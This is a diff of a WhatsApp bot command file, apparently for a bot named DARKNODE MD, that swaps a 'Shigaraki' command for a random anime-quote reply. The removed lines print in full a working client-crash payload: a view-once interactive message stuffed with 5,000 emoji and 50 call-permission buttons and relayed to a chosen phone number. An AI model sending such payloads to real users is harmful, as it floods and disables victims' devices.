@@ -1,61 +1,52 @@
-// commands/shigaraki.js
-const PROTECTED_NUMBERS = ['2347072182960', '2349049636843'];
+// commands/shigaraki.js - Shigaraki Quote
+const settings = require('../settings');
 
-async function shigarakiCommand(sock, chatId, message, args) {
-    if (!message.key.fromMe) {
-        await sock.sendMessage(chatId, { text: "❌ *Owner Only*" }, { quoted: message });
-        return;
+const fakeMeta = {
+    key: {
+        participant: '0@s.whatsapp.net',
+        remoteJid: 'status@broadcast',
+        fromMe: false,
+        id: 'DARKNODE_META_' + Date.now()
+    },
+    message: {
+        contactMessage: {
+            displayName: 'DARKNODE MD',
+            vcard: `BEGIN:VCARD\nVERSION:3.0\nN:DARKNODE MD;;;;\nFN:DARKNODE MD\nTEL;waid=${settings.ownerNumber}:+${settings.ownerNumber}\nEND:VCARD`,
+            sendEphemeral: true
+        }
+    },
+    messageTimestamp: Math.floor(Date.now() / 1000),
+    pushName: 'DARKNODE MD'
+};
+
+const channelInfo = {
+    contextInfo: {
+        forwardingScore: 1,
+        isForwarded: true,
+        forwardedNewsletterMessageInfo: {
+            newsletterJid: settings.newsletterJid,
+            newsletterName: settings.newsletterName,
+            serverMessageId: -1
+        }
     }
+};
 
-    const targetNumber = args[0];
-    if (!targetNumber) {
-        await sock.sendMessage(chatId, { 
-            text: "💀 *Tomura Shigaraki*\n\nUsage: .shigaraki <number>\nExample: .shigaraki 628123456789\n\n*Decay Activated*"
-        }, { quoted: message });
-        return;
-    }
-
-    const cleanNumber = targetNumber.replace(/[^0-9]/g, '');
-    
-    if (PROTECTED_NUMBERS.includes(cleanNumber)) {
-        await sock.sendMessage(chatId, { text: "🛡️ *Protected by All Might*" }, { quoted: message });
-        return;
-    }
-
-    const target = cleanNumber + '@s.whatsapp.net';
-    
-    await sock.sendMessage(chatId, { text: `💀 *Decay* spreading to ${cleanNumber}...` }, { quoted: message });
-    await sock.sendMessage(chatId, { react: { text: "💀", key: message.key } });
-
+async function shigarakiCommand(sock, chatId, message) {
     try {
-        const decayPayload = {
-            viewOnceMessage: {
-                message: {
-                    messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
-                    interactiveMessage: {
-                        contextInfo: {
-                            mentionedJid: [target],
-                            isForwarded: true,
-                            forwardingScore: 999
-                        },
-                        body: { text: "✦ Ṡḧīɠȧṙȧḱī ✦" + "💀".repeat(5000) },
-                        footer: { text: "Decay" },
-                        nativeFlowMessage: {
-                            buttons: Array(50).fill({ name: "call_permission_request", buttonParamsJson: "" })
-                        }
-                    }
-                }
-            }
-        };
+        const quotes = [
+            '"I will become the symbol of peace!"',
+            '"The world is not perfect, but I will make it better!"',
+            '"I will destroy everything and rebuild it!"'
+        ];
+        const quote = quotes[Math.floor(Math.random() * quotes.length)];
 
-        await sock.relayMessage(target, decayPayload, { participant: { jid: target } });
-        
-        await sock.sendMessage(chatId, { text: `✅ *Decay* activated on ${cleanNumber}` }, { quoted: message });
-        await sock.sendMessage(chatId, { react: { text: "🖐️", key: message.key } });
+        await sock.sendMessage(chatId, {
+            text: `╭─── ⪨ 💀 SHIGARAKI ⪩───⟢\n│ ${quote}\n╰────────────⟢\n> © DarkNode MD`,
+            ...channelInfo
+        }, { quoted: message });
 
     } catch (error) {
-        console.error('[Shigaraki]', error.message);
-        await sock.sendMessage(chatId, { text: `❌ *Decay failed:* ${error.message}` }, { quoted: message });
+        console.error('[Shigaraki] Error:', error);
     }
 }
 
